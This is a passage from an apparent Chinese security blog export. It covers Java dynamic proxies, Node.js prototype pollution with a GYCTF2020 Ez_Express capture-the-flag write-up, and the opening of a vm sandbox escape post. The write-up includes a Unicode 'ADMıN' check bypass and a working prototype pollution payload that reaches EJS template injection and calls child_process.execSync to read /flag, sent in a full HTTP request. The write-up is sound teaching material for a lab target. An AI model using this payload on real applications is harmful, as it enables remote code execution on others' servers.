/y1zh3e7/Picgo/Blogimg/202210042246526.png)\n\n如果hashCode值不为-1，那么就会return，这个就是我们前面提到要将hashCode的值设置为-1的原因。\n\n我们继续跟，handler此时是一个`URLStreamHandler`对象，继续跟进它的hashCode方法。\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042248715.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042248715.png)\n\n这里调用了getHostAddress方法，继续跟。\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042248820.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042248820.png)\n\n到这里可以看到`InetAddress.getByName(host)`的作用是根据主机名，获取其ip地址，在网络上就是一次DNS查询，我们可以通过burp的`Collaborator client`来看到这次url请求。\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210051442767.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210051442767.png)\n\n# 代理模式\n\n在Spirng中，AOP的底层实现就是代理模式，代理模式分为两种：\n\n- 静态代理\n- 动态代理\n\n## 什么是代理？\n\n我们用一个租房的例子来说明，按照正常的逻辑来讲，房东想要将自己的房子出租，并且此时有一个租客想租这个房子，那么租客就可以直接找到房东完成租房子这件事：\n\n![Untitled 1](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/Untitled%201.png)\n\n但是现在房东不想处理一些在租房过程中需要进行的繁琐步骤，比如打广告啊，和租客议价等等，所以这时候出现了一个新角色，叫做中介，那么此时房东所做的事只有出租自己的房子，其他事项全部交由中介来做，所以这个时候租客如果想租房子是不能直接找到房东的，必须在中间经由中介，中介来完成大部分事宜，并且在此时中介与房东共同完成租房这件事：\n\n![Untitled](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/Untitled.png)\n\n## 静态代理\n\n角色分析：\n\n- 抽象角色（租房这件事）：一般会使用抽象类或者接口来解决\n- 真实角色（房东）：被代理的角色\n- 代理角色（中介）：代理真实角色，代理真实角色后，我们一般会做一些附属操作\n- 客户（租客）：访问代理对象的人\n\n代码实现：\n\n租房 Rent接口：\n\n```java\npackage com.y1zh3e7.demo01;\n\npublic interface Rent {\n    public void rent();\n}\n```\n\n房东 Host类：\n\n```java\npackage com.y1zh3e7.demo01;\n\npublic class Host implements Rent{\n    public void rent()\n    {\n        System.out.println(\"房东要出租房子\");\n    }\n}\n```\n\n中介 Proxy类：\n\n```java\npackage com.y1zh3e7.demo01;\n\npublic class Proxy implements Rent{\n    private Host host;\n\n    public Proxy() {\n    }\n\n    public Proxy(Host host) {\n        this.host = host;\n    }\n    public void rent(){\n        host.rent();\n        seeHouse();\n        getFare();\n    };\n\n    public void seeHouse()\n    {\n        System.out.println(\"中介带你看房\");\n    }\n\n    public void getFare()\n    {\n        System.out.println(\"中介收中介费了\");\n    }\n}\n```\n\n租客 Client类：\n\n```java\npackage com.y1zh3e7.demo01;\n\npublic class Client {\n    public static void main(String[] args) {\n        Host host = new Host();\n        Proxy proxy = new Proxy(host);\n    }\n}\n```\n\n可以发现房东只专注实现了租房这件事，而中介不仅帮房东实现了租房，而且自己也添加了格外的功能，比如看房收中介费等等。\n\n代理模式的好处：\n\n- 可以时真是角色的目的更加纯粹，不用去关注一些公共的业务\n- 公共业务交给代理角色，实现了业务的分工\n- 公共业务发生扩展时，便于集中管理\n\n缺点：\n\n- 一个真实角色就会产生一个代理角色，代码量翻倍，开发效率变低\n\n## 动态代理\n\n- 动态代理和静态代理角色一样\n- 动态代理的代理类是自动生成的，不是我们直接写好的\n- 动态代理分为三大类：\n  - 基于接口的动态代理——JDK的动态代理\n  - 基于类的动态代理——cglib\n  - java字节码实现——Javassist\n\n动态代理需要了解两个类：Proxy：代理，InvocationHandler：调用处理程序\n\n整个动态代理大概流程如下：\n\n- Proxy.newProxyInstance 生成一个动态代理对象proxy，并且告诉这个proxy要代理哪个接口，这里注意此时必须要是接口才行，动态代理是无法代理一个类的，因此当动态代理接收到一个类时要转为该类所继承的接口。\n- 客户调用被代理对象的某一方法，此时java会将访问代理对象这个请求转发给动态代理对象proxy，并且在proxy的invoke中实现该方法\n\n### 代码实现：\n\nRent接口 被代理对象和proxy对象共同实现的接口：\n\n```java\npackage com.y1zh3e7.demo03;\n\npublic interface Rent {\n    public void rent();\n}\n```\n\nHost 被代理对象:\n\n```java\npackage com.y1zh3e7.demo03;\n\npublic class Host implements Rent {\n    public void rent()\n    {\n        System.out.println(\"房东要出租房子\");\n    }\n}\n```\n\n动态代理工具类 ProxyInvocationHandler：\n\n```java\npackage com.y1zh3e7.demo03;\n\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Method;\nimport java.lang.reflect.Proxy;\n\npublic class ProxyInvocationHandler implements InvocationHandler {\n    private Rent rent;\n\n\t\t// 使用动态代理时通过setter传入要被代理的对象\n    public void setRent(Rent rent) {\n        this.rent = rent;\n    }\n\n\t\t// 通过getProxy方法获得一个动态代理实例\n    public Object getProxy()\n    {\n\t\t\t// 通过Proxy.newProxyInstance初始化一个动态代理对象出来 三个参数基本上只有第二个是变化的，为被代理的接口，其他两个参数可以像这里一样写死\n        return Proxy.newProxyInstance(this.getClass().getClassLoader(), rent.getClass().getInterfaces(), this);\n    }\n\n    @Override\n\t\t// 当调用一个被代理对象的方法时，会在此处执行，invoke内可以自己构造如何执行该方法，从而达到了扩展方法功能的目的\n\t\t// 三个参数分别为 代理对象 代理对象被调用的方法 调用该方法的参数\n    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n       Object result =  method.invoke(rent,args);\n        return result;\n    }\n}\n```\n\nClient\n\n```java\npackage com.y1zh3e7.demo03;\n\npublic class Client {\n    public static void main(String[] args) {\n        Host host = new Host();\n        ProxyInvocationHandler pih = new ProxyInvocationHandler();\n        pih.setRent(host); // 将要代理的对象设置为host\n        Rent proxy = (Rent) pih.getProxy(); // 拿到被代理接口的代理对象\n        proxy.rent(); // 调用该方法后会将这个方法传给代理对象中的invoke方法来执行\n    }\n}\n```\n","tags":["Java反序列化"],"categories":["WebSec"]},{"title":"Nodejs原型链污染","url":"/2023/04/21/Nodejs原型链污染/","content":"# Nodejs原型链污染\n\n## Nodejs与JavaScript和JSON\n\n有一些人在学习JavaScript时会分不清Nodejs和JavaScript之间的区别 如果没有node 那么我们的JavaScript代码则由浏览器中的JavaScript解析器进行解析 几乎所有的浏览器都配备了JavaScript的解析功能（最出名的就是google的v8） 这也是为什么我们能在f12中直接执行JavaScript的原因  而Nodejs则是由这个解析器单独从浏览器中拿出来 并进行了一系列的处理 最后成为了一个可以在服务端运行JavaScript的环境  这里看到一个很好的例子 学过java的师傅应该就明白了\n\n![image-20220730001418207](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207300014261.png)\n\n那么JSON又是什么呢 简单概括一下就是JavaScript的对象表示方法 它表示的是声明对象的一种格式  由于我们从前端接收到的数据基本都是字符串 因此在服务端如果要将这些字符串处理为其他格式 比如对象 就需要用到JSON了 \n\n![image-20220730002328146](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207300023195.png)\n\n\n\n## 原型对象（`prototype`）与原型连接点（`__proto__`）与原型链\n\n![image-20220730145926681](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207301459737.png)\n\n在c++或java这些面向对象的语言中 我们如果想要一个对象首先需要使用关键字class声明一个类 再使用关键字new一个对象出来 但是在JavaScript中没有class 以及类这种概念（为了简化编写JavaScript代码，ECMAScript 6后增加了`class`语法，但`class`其实只是一个语法糖） 在JavaScript有这么两种声明对象的方式 为了好理解我们先引入类的思想\n\n```javascript\nperson=new Object()\nperson.firstname=\"John\";\nperson.lastname=\"Doe\";\nperson.age=50;\nperson.eyecolor=\"blue\";\n\n这种创建对象的方法还有另一种写法 如下\nperson={firstname:\"John\",lastname:\"Doe\",age:50,eyecolor:\"blue\"};\n\n这种方法通过直接实例化构造方法Object()来创建对象\n```\n\n```JavaScript\nfunction person(firstname,lastname,age,eyecolor)  这里创建了一个“类” 但是在JavaScript中叫做构造函数或者构造器\n{\n    this.firstname=firstname;\n    this.lastname=lastname;\n    this.age=age;\n    this.eyecolor=eyecolor;\n}\nvar myFather=new person(\"John\",\"Doe\",50,\"blue\");\t通过这个“类”实例化对象\nvar myMother=new person(\"Sally\",\"Rally\",48,\"green\");\n\n这种方法先创建构造函数 再实例化构造函数 构造函数function也属于Object 如果对这里为什么属于Object而不属于Function有疑问请继续阅读 下面会解释\n```\n\n既然是通过实例化Object来创建对象或创建构造函数\n\n 在JavaScript中有两个很特殊的对象 Function() 和 Object()  它们两个既是构造函数也是对象 作为对象是不是应该有一个“类”去作为他们的模板呢\n\n对于Object()来说 要声明这么一个构造函数我们可以使用关键字function来创建 （在底层 使用function创建一个函数 其实就相当于这个过程） \n\n```javascript\nfunction Object()\n{\n\n}\n在底层为\nvar Object = new Function();\n```\n\n那么对于Function自己这个对象他是怎么来的呢 如果用Function.`__proto__`和Function.prototype进行比较发现二者是全等的 所以Function创造了自己 也创造了Object 所以JavaScript中 所有函数都是对象 而对象是通过函数创建的 因此`构造函数.prototype.__proto__ `应该是Object.prototype 而不是Function.prototype   Function的作用是创建而不是继承\n\n![image-20220730140259067](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207301402091.png)\n\n![image-20220730140053998](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207301401083.png)\n\n那么提到了`__proto__`和`prototype`我们就来说说这两个是什么东西\n\n首先我们要了解以下概念\n\n- `__proto__`是任何一个对象拥有的属性    `prototype`是任何一个函数拥有的一个属性  \n\n比如\n\n```JavaScript\nperson={firstname:\"John\",lastname:\"Doe\",age:50,eyecolor:\"blue\"};\n```\n\n那么这个person对象就拥有了`person.__proto__`这个属性 而Object()我们刚才提到了是由Function创建来的一个构造函数 那么Object就天生有了Object.prototype \n\n- 某一对象的 `__proto__`指向它的prototype（原型对象） 也就是说如果直接访问`person.__proto__` 那么就相当于访问了Object.prototype\n- JavaScript使用prototype链实现继承机制\n- 构造函数xxx.prototype是一个对象 xxx.prototype也有自己的`__proto__`属性 并且可以继续指向它的的prototype\n- Object.prototype.proto最终指向null 这也是所有原型链的终点\n- 从一个对象的`__proto__`不断向上指向原型对象最终指向Objecct.prototype后接着指向为Null 这一条链子就叫做原型链\n\n有条件的师傅也可以把下面的视频合集看一下 对理解原型和原型链有很大的帮助\n\n[4_Function与Object的特殊性_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1ci4y157Ci?p=4&spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=ce28d3130b8ba56f85e090c857c00132)\n\n 如果我们有如下代码：\n\n```JavaScript\nfunction Father() {\n    this.first_name = 'Donald'\n    this.last_name = 'Trump'\n}\n\nfunction Son() {\n    this.first_name = 'Melania'\n}\n\nSon.prototype = new Father()\n\nlet son = new Son()\nconsole.log(`Name: ${son.first_name} ${son.last_name}`)\n```\n\n那么按照上述说法 就有如下结构\n\n![image-20220730150413742](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207301504781.png)\n\n对于对象son，在调用`son.last_name`的时候，实际上JavaScript引擎会进行如下操作：\n\n1. 在对象son中寻找last_name\n2. 如果找不到，则在`son.__proto__`中寻找last_name\n3. 如果仍然找不到，则继续在`son.__proto__.__proto__`中寻找last_name\n4. 依次寻找，直到找到`null`结束。\n\n## 原型链污染\n\n举个栗子\n\n```JavaScript\n// 这个对象直接实例化Object()\nlet foo = {bar: 1}\n\n// foo.bar 此时为1\nconsole.log(foo.bar)\n\n// 修改foo的原型（即Object）\nfoo.__proto__.bar = 2\n\n// 由于查找顺序的原因，foo.bar仍然是1\nconsole.log(foo.bar)\n\n// 此时再用Object创建一个空的zoo对象\nlet zoo = {}\n\n// 查看zoo.bar\nconsole.log(zoo.bar)\n```\n\n![image-20220730154030880](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207301540927.png)\n\n这里由于修改了`foo.__proto__.bar` 也就是修改了Object.bar 因此在后续的实例化对象中 新的对象会继承这一属性 造成了原型链污染\n\n在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？\n\n我们思考一下，哪些情况下我们可以设置`__proto__`的值呢？其实找找能够控制数组（对象）的“键名”的操作即可\n\n看下面代码 一个简单的对象clone\n\n```JavaScript\nfunction merge(target, source) {\n    for (let key in source) {\n        if (key in source && key in target) {  \n            // 如果target与source有相同的键名 则让target的键值为source的键值\n            merge(target[key], source[key])\n        } else {\n            target[key] = source[key]  // 如果target与source没有相通的键名 则直接在target新建键名并赋给键值\n        }\n    }\n}\nlet o1 = {}\nlet o2 = {a: 1, \"__proto__\": {b: 2}}\nmerge(o1, o2)\nconsole.log(o1.a, o1.b)\n\no3 = {}\nconsole.log(o3.b)\n```\n\n![image-20220730155049173](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207301550219.png)\n\n这里执行后发现 虽然两个对象成功clone 但是Object()并没用被污染 这是因为在创建o2时 `__proto__`是已经存在于o2中的属性了 解析器并不能将这个属性解析为键值 所以要用JSON去修改代码（前面我们说了 JSON是JavaScript的对象表示方法 可以将字符串转换为对象） 这样就可以使`__proto__`被成功解析成键名了\n\n```JavaScript\nlet o1 = {}\nlet o2 = JSON.parse('{\"a\": 1, \"__proto__\": {\"b\": 2}}')\nmerge(o1, o2)\nconsole.log(o1.a, o1.b)\n\no3 = {}\nconsole.log(o3.b)\n```\n\n![image-20220730155547273](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202207301555313.png)\n\n## 漏洞复现\n\n### [GYCTF2020]Ez_Express\n\n进入环境之后是一个登录页面 测试之后发现存在www.zip源码泄露 开始审计index.js\n\n```javascript\nvar express = require('express');\nvar router = express.Router();\nconst isObject = obj => obj && obj.constructor && obj.constructor === Object;\nconst merge = (a, b) => {\n  for (var attr in b) {\n    if (isObject(a[attr]) && isObject(b[attr])) {\n      merge(a[attr], b[attr]);\n    } else {\n      a[attr] = b[attr];\n    }\n  }\n  return a\n}\nconst clone = (a) => {\n  return merge({}, a);\n}\nfunction safeKeyword(keyword) {\n  if(keyword.match(/(admin)/is)) {\n      return keyword\n  }\n\n  return undefined\n}\n\nrouter.get('/', function (req, res) {\n  if(!req.session.user){\n    res.redirect('/login');\n  }\n  res.outputFunctionName=undefined;\n  res.render('index',data={'user':req.session.user.user});\n});\n\n\nrouter.get('/login', function (req, res) {\n  res.render('login');\n});\n\n\n\nrouter.post('/login', function (req, res) {\n  if(req.body.Submit==\"register\"){\n   if(safeKeyword(req.body.userid)){\n    res.end(\"<script>alert('forbid word');history.go(-1);</script>\") \n   }\n    req.session.user={\n      'user':req.body.userid.toUpperCase(),\n      'passwd': req.body.pwd,\n      'isLogin':false\n    }\n    res.redirect('/'); \n  }\n  else if(req.body.Submit==\"login\"){\n    if(!req.session.user){res.end(\"<script>alert('register first');history.go(-1);</script>\")}\n    if(req.session.user.user==req.body.userid&&req.body.pwd==req.session.user.passwd){\n      req.session.user.isLogin=true;\n    }\n    else{\n      res.end(\"<script>alert('error passwd');history.go(-1);</script>\")\n    }\n  \n  }\n  res.redirect('/'); ;\n});\nrouter.post('/action', function (req, res) {\n  if(req.session.user.user!=\"ADMIN\"){res.end(\"<script>alert('ADMIN is asked');history.go(-1);</script>\")} \n  req.session.user.data = clone(req.body);\n  res.end(\"<script>alert('success');history.go(-1);</script>\");  \n});\nrouter.get('/info', function (req, res) {\n  res.render('index',data={'user':res.outputFunctionName});\n})\nmodule.exports = router;\n\n```\n\n看下面两段代码\n\n```JavaScript\nfunction safeKeyword(keyword) {\n  if(keyword.match(/(admin)/is)) {\n      return keyword\n  }\n\n  return undefined\n}\n```\n\n```JavaScript\nrouter.post('/login', function (req, res) {\n  if(req.body.Submit==\"register\"){\n   if(safeKeyword(req.body.userid)){\n    res.end(\"<script>alert('forbid word');history.go(-1);</script>\") \n   }\n    req.session.user={\n      'user':req.body.userid.toUpperCase(),\n      'passwd': req.body.pwd,\n      'isLogin':false\n    }\n    res.redirect('/'); \n  }\n  else if(req.body.Submit==\"login\"){\n    if(!req.session.user){res.end(\"<script>alert('register first');history.go(-1);</script>\")}\n    if(req.session.user.user==req.body.userid&&req.body.pwd==req.session.user.passwd){\n      req.session.user.isLogin=true;\n    }\n    else{\n      res.end(\"<script>alert('error passwd');history.go(-1);</script>\")\n    }\n  \n  }\n  res.redirect('/'); ;\n});\n```\n\n只有用admin登录才会return keyword 否则返回undefined 返回undefined就会弹窗forbid word 如果username经过toUpperCase后不能与原来的匹配 或password错误 就会弹窗error passwd 这也是为什么题中说用户名只支持大写\n\n再看这段 就很恶心 如果username为ADMIN就不能登录 又不让用admin 又得用admin登录 这里就用到了JavaScript大小写的漏洞\n\n原理移步p神博客 [Fuzz中的javascript大小写特性 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html)\n\n```javascript\nif(req.session.user.user!=\"ADMIN\"){res.end(\"<script>alert('ADMIN is asked');history.go(-1);</script>\")} \n```\n\n所以用`ADMıN`来绕过 注意不是ADMiN 中间那个i是一个奇怪的字符 把username输入ADMıN直接注册就可以了（题目环境怪怪的 有的时候ADMıN 不行就试试admın）登录进去还给了flag的位置\n\n![](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202208032133466.png)\n\n![image-20220803213711682](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202208032137738.png)\n\n这里试了试没啥用 继续看源码 上面提到了 merge clone操作可以控制键值和键名 从而达到污染\n\n```JavaScript\nconst merge = (a, b) => {\n  for (var attr in b) {\n    if (isObject(a[attr]) && isObject(b[attr])) {\n      merge(a[attr], b[attr]);\n    } else {\n      a[attr] = b[attr];\n    }\n  }\n  return a\n}const merge = (a, b) => {\n  for (var attr in b) {\n    if (isObject(a[attr]) && isObject(b[attr])) {\n      merge(a[attr], b[attr]);\n    } else {\n      a[attr] = b[attr];\n    }\n  }\n```\n\n往下看找到调用clone的位置\n\n```javascript\nrouter.post('/action', function (req, res) {\n  if(req.session.user.user!=\"ADMIN\"){res.end(\"<script>alert('ADMIN is asked');history.go(-1);</script>\")} \n  req.session.user.data = clone(req.body);\n  res.end(\"<script>alert('success');history.go(-1);</script>\");  \n});\n```\n\n也就是说我们可以在action路由下通过请求体来进行污染 原型链污染的位置找到了 接下来就是要找到可以用来控制键名和键值的对象\n\n看到这段\n\n```javascript\nrouter.get('/info', function (req, res) {\n  res.render('index',data={'user':res.outputFunctionName});\n})\n```\n\nrender函数应该不陌生 在模板注入攻击（SSTI）中很常见  这里将回显req的outputFunctionNmae渲染到了index中 那么我们是不是可以利用outputFunctionName进行SSTI从而达到rce呢 代码跟下来我们发现并没有outputFunctionName这个东西 也就是说它是我们可以用来污染原型链的载体 如果把Object的prototype中加上键名为outputFunctionName 键值为恶意payload的属性 那么在进行模板渲染时 是不是就会执行我们的恶意payload\n\n但是我们考虑一个问题 如何去修改Object的prototype （确实是可以的 但是有点麻烦 下面参考文章的最后一篇就是直接修改Object的prototypr）我们重新回到这段代码\n\n```JavaScript\nrouter.post('/action', function (req, res) {\n  if(req.session.user.user!=\"ADMIN\"){res.end(\"<script>alert('ADMIN is asked');history.go(-1);</script>\")} \n  req.session.user.data = clone(req.body);\n  res.end(\"<script>alert('success');history.go(-1);</script>\");  \n});\n```\n\n发现请求体被clone到了req.session.user.data中 对于req.session.user这个对象来说 它的`__proto__`属性是不是就是Object的prototype 所以我们可以修改了这个对象的`__proto__`从而达到目的\n\n```JavaScript\nreq.session.user={\n      'user':req.body.userid.toUpperCase(),\n      'passwd': req.body.pwd,\n      'isLogin':false\n    }\n```\n\nSSTI的payload我也不是很懂 反正原理都是不断调用原型对象 最后找到一个可以用来rce的函数 payload和`CVE-2019-10744`是一样的 直接搬来用了\n\n```javascript\n{\"__proto__\":{\"outputFunctionName\":\"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag');//\"}}\n```\n\n污染成功后在info路由下调用res.outputFunctionName时 就像上面调用`son.last_name`的过程一样 最终调用到了Object的outputFunctionName 并且要让`__proto__`为键名 要用JSON格式 所以要用burp拦包添加content type（在进行POST传参时必须有该头） 放个包做个参考 记得路由和传参方式也要改 再传payload\n\n```shell\nPOST /action HTTP/1.1\nHost: 8f9161b2-5acd-465d-8854-969004e758fb.node4.buuoj.cn:81\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://8f9161b2-5acd-465d-8854-969004e758fb.node4.buuoj.cn:81/login\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: session=s%3A1jilnCKBesMA5qC1gPlt6SPb18ntn7h7.4wyQ3TbDJtVXUhdOdErxMFKs6EcCnNrCkeUjRFYK3MY\nContent-Type: application/json\nConnection: close\nContent-Length: 137\n\n{\"__proto__\":{\"outputFunctionName\":\"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag');//\"}}\n\n```\n\n在action路由下污染成功后应该接着访问info路由进行SSTI 但是不知道为啥我包发过去直接给flag了 \n\n![image-20220803221639344](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202208032216423.png)\n\n## 参考文章\n\n[深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript)\n\n[【全网首发:已完结】快速搞懂『原型、原型链』【JavaScript基础专题】_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1ci4y157Ci?p=1&vd_source=ce28d3130b8ba56f85e090c857c00132)\n\n [GYCTF2020\\]Ez_Express 原型链污染_-栀蓝-的博客-CSDN博客](https://blog.csdn.net/qq_54929891/article/details/124556857?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1-124556857-blog-125721365.pc_relevant_multi_platform_featuressortv2removedup&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1-124556857-blog-125721365.pc_relevant_multi_platform_featuressortv2removedup&utm_relevant_index=2)\n\n[Fuzz中的javascript大小写特性 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html)\n\n [Web/Nodejs\\]原型链污染EJS模块的利用分析(附源码分析)_車鈊的博客-CSDN博客](https://blog.csdn.net/DARKNOTES/article/details/124000520)\n\nhttps://xz.aliyun.com/t/6113#toc-4\n","tags":["原型链污染"],"categories":["WebSec"]},{"title":"VM沙箱逃逸","url":"/2023/04/20/VM沙箱逃逸/","content":"\n\n\n**参考文章**：https://blog.csdn.net/m0_62063669/article/details/125441529\n\n​\t\t\t\t\thttps://blog.csdn.net/u012961419/article/details/121281538\n\n​\t\t\t\t\thttps://blog.csdn.net/sunyctf/article/details/124434565\n\n​\t\t\t\t\thttps://www.mianshigee.com/note/detail/27897wlr/#script-runinnewcontext-sandbox-options\n\n​\t\t\t\t\thttps://blog.csdn.net/shawdow_bug/article/details/120072209?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-120072209-blog-119792059.pc_relevant_3mothn_strategy_and_data_recovery&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-120072209-blog-119792059.pc_relevant_3mothn_strategy_and_data_recovery&utm_relevant_index=2\n\n[Proxy 和 Reflect - 掘金 (juejin.cn)](https://juejin.cn/post/6844904090116292616)\n\n[vm2实现原理分析-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/207283#h2-1)\n\n​\t\t\t\t\t**P神知识星球**\n\n​\t\t\t\t\t\n\n## **0x01 沙箱逃逸初识**\n\n说到沙箱逃逸，我们先来明确一些基本的概念。\n\n- JavaScript和Nodejs之间有什么区别：JavaScript用在浏览器前端，后来将Chrome中的v8引擎单独拿出来为JavaScript单独开发了一个运行环境，因此JavaScript也可以作为一门后端语言，写在后端（服务端）的JavaScript就叫叫做Nodejs。\n- 什么是沙箱（sandbox）当我们运行一些可能会产生危害的程序，我们不能直接在主机的真实环境上进行测试，所以可以通过单独开辟一个运行代码的环境，它与主机相互隔离，但使用主机的硬件资源，我们将有危害的代码在沙箱中运行只会对沙箱内部产生一些影响，而不会影响到主机上的功能，沙箱的工作机制主要是依靠重定向，将恶意代码的执行目标重定向到沙箱内部。\n- 沙箱（sandbox）和 虚拟机（VM）和 容器（Docker）之间的区别：sandbox和VM使用的都是虚拟化技术，但二者间使用的目的不一样。沙箱用来隔离有害程序，而虚拟机则实现了我们在一台电脑上使用多个操作系统的功能。Docker属于sandbox的一种，通过创造一个有边界的运行环境将程序放在里面，使程序被边界困住，从而使程序与程序，程序与主机之间相互隔离开。在实际防护时，使用Docker和sandbox嵌套的方式更多一点，安全性也更高。\n- 在Nodejs中，我们可以通过引入vm模块来创建一个“沙箱”，但其实这个vm模块的隔离功能并不完善，还有很多缺陷，因此Node后续升级了vm，也就是现在的vm2沙箱，vm2引用了vm模块的功能，并在其基础上做了一些优化。\n\n## **0x02 Node将字符串执行为代码**\n\n我们先来看两个在node中将把字符串执行成代码的方式。\n\n**方法一 eval**\n\n首先我在目录下创建一个age.txt\n\n```javascript\nvar age = 18\n```\n\n创建一个y1.js\n\n```javascript\nconst fs = require('fs')\n\nlet content = fs.readFileSync('age.txt', 'utf-8')\n\nconsole.log(content)\n\neval(content)\n\nconsole.log(age)\n```\n\n![image-20221010091326622](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210100913712.png)\n\n可以发现我们通过eval执行了一个字符串，但是这种执行方式如果在当前作用域下已经有了同名的age变量，这个程序就会报错。\n\n![image-20221010091728679](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210100917743.png)\n\n在js中每一个模块都有自己独立的作用域，所以用eval执行字符串代码很容易出现上面的这个问题，我们再看另外一种方法。\n\n\n\n**方法二：new Function**\n\n上面的方法因为模块间的作用域被限制了使用，那么我们考虑一下如果能够自己创建一个作用域是不是就可以更加方便的执行代码呢？new Function的第一个参数是形参名称，第二个参数是函数体。\n\n![image-20221010092417799](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210100924849.png)\n\n我们都知道函数内和函数外是两个作用域，不过当在函数中的作用域想要使用函数外的变量时，要通过形参来传递，当参数过多时这种方法就变的麻烦起来了。\n\n\n\n从上面两个执行代码的例子可以看出来其实我们的思想就是如何创建一个**能够通过传一个字符串就能执行代码，并且还与外部隔绝的作用域**，这也就是vm模块的作用。\n\n## **0x03 Nodejs作用域**\n\n\n\n说到作用域，我们就要说一下Node中的作用域是怎么分配的（在Node中一般把作用域叫上下文）。\n\n在Web端（浏览器），发挥作用的一般是JavaScript，学过JavaScript的师傅应该都知道我们打开浏览器的窗口是JavaScript中最大的对象`window`，那么在服务端发挥作用的Node它的构造和JavaScript不太一样。\n\n我们在写一个Node项目时往往要在一个文件里ruquire其他的js文件，这些文件我们都给它们叫做“包”。每一个包都有一个自己的上下文，包之间的作用域是互相隔离不互通的，也就是说就算我在y1.js中require了y2.js，那么我在y1.js中也无法直接调用y2.js中的变量和函数，举个例子。\n\n在同一级目录下有`y1.js`和`y2.js`两个文件\n\n`y1.js`\n\n```javascript\nvar age = 20\n```\n\n`y2.js`\n\n```javascript\nconst a = require(\"./y1\")\n\nconsole.log(a.age)\n```\n\n运行y2.js发现报错 `age` 值为undefined\n\n![image-20221012144134438](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210121441474.png)\n\n\n\n那么我们想y2中引入并使用y1中的元素应该怎么办呢，Node给我们提供了一个将js文件中元素输出的接口`exports` ，把y1修改成下面这样：\n\n`y1.js`\n\n```javascript\nvar age = 20\n\nexports.age = age\n```\n\n我们再运行y2就可以拿到age的值了\n\n![](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210121445172.png)\n\n我们用图来解释这两个包之间的关系就是\n\n![image-20221012144913712](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210121449758.png)\n\n这个时候就有人会问左上角的global是什么？这里就要说到Nodejs中的全局对象了。\n\n刚才我们提到在JavaScript中`window`是全局对象，浏览器其他所有的属性都挂载在`window`下，那么在服务端的Nodejs中和`window`类似的全局对象叫做`global`，Nodejs下其他的所有属性和包都挂载在这个global对象下。在global下挂载了一些全局变量，我们在访问这些全局变量时不需要用`global.xxx`的方式来访问，直接用`xxx`就可以调用这个变量。举个例子，`console`就是挂载在global下的一个全局变量，我们在用`console.log`输出时并不需要写成`global.console.log`，其他常见全局变量还有process（一会逃逸要用到）。\n\n我们也可以手动声明一个全局变量，但全局变量在每个包中都是共享的，所以尽量不要声明全局变量，不然容易导致变量污染。用上面的代码举个例子：\n\n`y1.js`\n\n```javascript\nglobal.age = 20\n```\n\n `y2.js`\n\n```javascript\nconst a = 